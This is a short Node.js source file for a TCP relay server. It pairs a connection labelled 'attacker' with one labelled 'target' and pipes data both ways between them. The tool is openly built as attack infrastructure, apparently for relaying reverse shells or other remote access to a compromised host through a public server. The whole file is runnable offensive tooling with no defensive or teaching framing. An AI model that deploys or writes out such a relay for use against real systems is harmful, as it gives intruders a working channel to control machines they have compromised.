const net = require("net");

// Configuration
const TUNNEL_PORT = process.env.PORT || 4545; // The single port to listen on

let attackerClient = null;
let targetClient = null;

// Function to forward data between clients
function forwardData(src, dest) {
  src.on("data", (data) => {
    if (dest) {
      dest.write(data);
    }
  });

  src.on("close", () => {
    if (dest) {
      dest.end();
    }
  });

  src.on("error", (err) => {
    console.error("Socket error:", err);
    if (dest) {
      dest.end();
    }
  });
}

// Create a server
const server = net.createServer((socket) => {
  if (!attackerClient) {
    console.log("Attacker connected");
    attackerClient = socket;

    if (targetClient) {
      forwardData(attackerClient, targetClient);
      forwardData(targetClient, attackerClient);
    }
  } else if (!targetClient) {
    console.log("Target connected");
    targetClient = socket;

    if (attackerClient) {
      forwardData(attackerClient, targetClient);
      forwardData(targetClient, attackerClient);
    }
  } else {
    console.log("Both clients are already connected");
    socket.end();
  }
});

// Start listening on the single port
server.listen(TUNNEL_PORT, () => {
  console.log(`Listening on port ${TUNNEL_PORT}`);
});
